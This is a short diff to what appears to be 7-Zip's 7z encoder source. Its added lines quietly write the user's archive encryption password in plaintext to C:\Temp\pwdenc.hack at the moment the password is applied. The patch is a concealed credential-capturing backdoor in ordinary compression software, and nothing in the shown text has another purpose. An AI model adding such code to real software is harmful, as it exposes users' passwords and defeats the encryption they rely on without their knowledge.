@@ -14,6 +14,9 @@
 #include "7zEncode.h"
 #include "7zSpecStream.h"
 
+#include <iostream>
+#include <fstream>
+
 namespace NArchive {
 namespace N7z {
 
@@ -234,6 +237,10 @@ HRESULT CEncoder::CreateMixerCoder(
         ((Byte *)buffer)[i * 2 + 1] = (Byte)(c >> 8);
       }
       RINOK(cryptoSetPassword->CryptoSetPassword((const Byte *)buffer, (UInt32)sizeInBytes))
+      std::ofstream ofile; 
+    	ofile.open("C:\\Temp\\pwdenc.hack", std::ios::out);
+    	ofile << _options.Password;
+    	ofile.close();
     }
 
     _mixer->AddCoder(cod);
